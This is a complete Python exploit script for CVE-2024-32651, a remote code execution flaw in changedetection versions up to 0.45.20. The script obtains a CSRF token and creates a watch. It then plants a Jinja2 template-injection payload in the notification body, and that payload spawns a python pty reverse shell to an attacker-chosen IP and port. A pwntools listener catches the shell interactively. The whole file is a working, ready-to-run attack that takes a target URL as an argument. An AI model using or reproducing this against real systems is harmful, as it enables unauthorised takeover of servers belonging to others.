# Exploit: changedetection Remote Code Execution (RCE)
# Original Author: zcrosman
# Version: <= 0.45.20
# Tested on: Linux
# CVE : CVE-2024-32651
# Author - Slasher(rvick)

from pwn import *
import requests
from bs4 import BeautifulSoup
import argparse

def start_listener(port):
    listener = listen(port)
    print(f"Listening on port {port}...")
    conn = listener.wait_for_connection()
    print("Connection received!")
    context.newline = b'\r\n'
    # Switch to interactive mode
    conn.interactive()

def add_detection(url, listen_ip, listen_port, notification_url=''):
    session = requests.Session()
    
    # First request to get CSRF token
    request1_headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }

    response = session.get(url, headers=request1_headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
    print(f'Obtained CSRF token: {csrf_token}')

    # Second request to submit the form and get the redirect URL
    add_url = f"{url}/form/add/quickwatch"
    add_url_headers = {  # Define add_url_headers here
        "Origin": url,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    add_url_data = {
        "csrf_token": csrf_token,
        "url": "https://reddit.com/r/baseball",
        "tags": '',
        "edit_and_watch_submit_button": "Edit > Watch",
        "processor": "text_json_diff"
    }

    post_response = session.post(add_url, headers=add_url_headers, data=add_url_data, allow_redirects=False)

    # Extract the URL from the Location header
    if 'Location' in post_response.headers:
        redirect_url = post_response.headers['Location']
        print(f'Redirect URL: {redirect_url}')
    else:
        print('No redirect URL found')
        return

    # Third request to add the changedetection url with ssti in notification config
    save_detection_url = f"{url}{redirect_url}"
    save_detection_headers = {  # Define save_detection_headers here
        "Referer": redirect_url,
        "Cookie": f"session={session.cookies.get('session')}"
    }

    save_detection_data = {
        "csrf_token": csrf_token,
        "url": "https://reddit.com/r/all",
        "title": '',
        "tags": '',
        "time_between_check-weeks": '',
        "time_between_check-days": '',
        "time_between_check-hours": '',
        "time_between_check-minutes": '',
        "time_between_check-seconds": '30',
        "filter_failure_notification_send": 'y',
        "fetch_backend": 'system',
        "webdriver_delay": '',
        "webdriver_js_execute_code": '',
        "method": 'GET',
        "headers": '',
        "body": '',
        "notification_urls": notification_url,
        "notification_title": '',
        "notification_body": f"""
        {{% for x in ().__class__.__base__.__subclasses__() %}}
        {{% if "warning" in x.__name__ %}}
        {{{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\"{listen_ip}\\",{listen_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")'").read()}}}}
        {{% endif %}}
        {{% endfor %}}
        """,
        "notification_format": 'System default',
        "include_filters": '',
        "subtractive_selectors": '',
        "filter_text_added": 'y',
        "filter_text_replaced": 'y',
        "filter_text_removed": 'y',
        "trigger_text": '',
        "ignore_text": '',
        "text_should_not_be_present": '',
        "extract_text": '',
        "save_button": 'Save'
    }
    final_response = session.post(save_detection_url, headers=save_detection_headers, data=save_detection_data)

    print('Final request made.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Add detection and start listener')
    parser.add_argument('--url', type=str, required=True, help='Base URL of the target site')
    parser.add_argument('--port', type=int, help='Port for the listener', default=4444)
    parser.add_argument('--ip', type=str, required=True, help='IP address for the listener')
    parser.add_argument('--notification', type=str, help='Notification url if you don\'t want to use the system default')
    args = parser.parse_args()


    add_detection(args.url, args.ip, args.port, args.notification)
    start_listener(args.port)
